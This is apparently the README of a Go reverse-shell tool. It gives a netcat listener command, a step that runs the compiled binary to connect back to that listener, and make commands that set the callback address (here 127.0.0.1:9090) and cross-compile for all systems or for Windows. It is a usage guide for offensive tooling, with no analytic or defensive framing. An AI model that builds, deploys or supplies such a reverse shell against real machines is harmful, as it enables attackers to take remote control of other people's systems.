Reverse shell on Go

## How To

Listener side:
```
nc -lvp 9090
```

Connect to listener:
```
./bin/shell-linux
```

## Build

### For all OS

```
RS_ADDR=127.0.0.1:9090 make
```

### For specific OS

```
RS_ADDR=127.0.0.1:9090 make build-windows
```
